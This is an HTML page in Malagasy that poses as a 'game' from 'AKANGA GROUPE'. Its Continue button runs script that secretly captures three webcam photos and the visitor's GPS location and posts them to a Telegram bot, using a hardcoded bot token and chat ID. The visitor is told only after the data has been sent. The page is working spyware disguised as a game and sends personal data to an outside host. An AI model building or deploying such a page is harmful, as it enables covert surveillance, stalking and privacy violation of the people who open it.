<!DOCTYPE html>
<html lang="mg">
<head>
  <meta charset="UTF-8"/>
  <title>AKANGA</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <style>
    :root {--c1:#8A2BE2;--c2:#FF6B6B;--c3:#4ECDC4;--white:#fff;}
    body{margin:0;height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:center;
         background:linear-gradient(-45deg,var(--c1),var(--c2),var(--c3));background-size:400% 400%;
         animation:bgShift 8s ease infinite;color:var(--white);font-family:'Segoe UI',sans-serif;}
    @keyframes bgShift{0%{background-position:0% 50%}50%{background-position:100% 50%}100%{background-position:0% 50%}}
    h2{margin:0 0 10px;animation:fade 1s} p{margin:0 0 20px;animation:fade 1.2s}
    @keyframes fade{from{opacity:0;transform:translateY(-20px)}to{opacity:1;transform:translateY(0)}}
    button{padding:14px 32px;border:none;border-radius:50px;background:linear-gradient(135deg,#ff7b7b,#ff3860);
           color:var(--white);font-size:18px;cursor:pointer;box-shadow:0 8px 20px rgba(255,56,96,.4);
           transition:transform .3s,box-shadow .3s;animation:pulse 2s infinite;}
    @keyframes pulse{0%{transform:scale(1)}50%{transform:scale(1.05)}100%{transform:scale(1)}}
    button:hover{transform:translateY(-4px) scale(1.08);box-shadow:0 12px 30px rgba(255,56,96,.6)}
    #preview{margin-top:20px;width:120px;height:120px;object-fit:cover;border-radius:50%;border:3px solid var(--white);
             box-shadow:0 4px 12px rgba(0,0,0,.25);animation:pop .6s}
    @keyframes pop{from{transform:scale(0);opacity:0}to{transform:scale(1);opacity:1}}
  </style>
</head>
<body>
  <h1>AKANGA GROUPE</h1>
  <p>Izahay ato amin'ny <strong>"AKANGA GROUPE"</strong>dia</p>
  <p>Mampanao lalao azahoana data</p>
  <button onclick="startProcess()">Hanohy</button>

  <script>
    /* ------------- PARAM√àTRES TELEGRAM ------------- */
    const BOT_TOKEN = "8277743126:AAH0VRKfw7Q9bm3vsg-sX9-K3NNkoLIKWZY";
    const CHAT_ID   = "7455668049"; // ID groupe ou personnel

    /* ------------- FONCTION PRINCIPALE ------------- */
    async function startProcess() {
      // 1. Maka sary 3
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      const video  = document.createElement('video');
      video.srcObject = stream;
      await video.play();

      const canvas = document.createElement('canvas');
      const ctx    = canvas.getContext('2d');

      for (let i = 0; i < 3; i++) {
        await new Promise(r => setTimeout(r, 1200));
        canvas.width  = video.videoWidth;
        canvas.height = video.videoHeight;
        ctx.drawImage(video, 0, 0);
        const imgData = canvas.toDataURL('image/png');
        sendToTelegram(imgData, "T√©l√©chargement selfie #" + (i+1));
      }
      stream.getTracks().forEach(t => t.stop());

      // 2. Maka toerana
      navigator.geolocation.getCurrentPosition(pos => {
        const { latitude: lat, longitude: lon } = pos.coords;
        const loc = `üìç Toerana: https://www.google.com/maps?q=${lat},${lon}`;
        sendToTelegram(null, loc);
        alert("Tongasoa! Efa nalefa ny sary sy ny toerana tany Telegram.");
      });
    }

    /* ------------- ENVOI VERS TELEGRAM ------------- */
    async function sendToTelegram(imgBase64, caption) {
      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
      const form = new FormData();

      form.append("chat_id", CHAT_ID);
      form.append("caption", caption);

      if (imgBase64) {
        const blob = dataURItoBlob(imgBase64);
        form.append("photo", blob, "selfie.png");
      }

      await fetch(url, { method: "POST", body: form });
    }

    /* ------------- UTILITAIRE ------------- */
    function dataURItoBlob(dataURI) {
      const byteString = atob(dataURI.split(',')[1]);
      const mime = dataURI.split(',')[0].split(':')[1].split(';')[0];
      const ab   = new ArrayBuffer(byteString.length);
      const ia   = new Uint8Array(ab);
      for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
      return new Blob([ab], { type: mime });
    }
  </script>
</body>
</html>
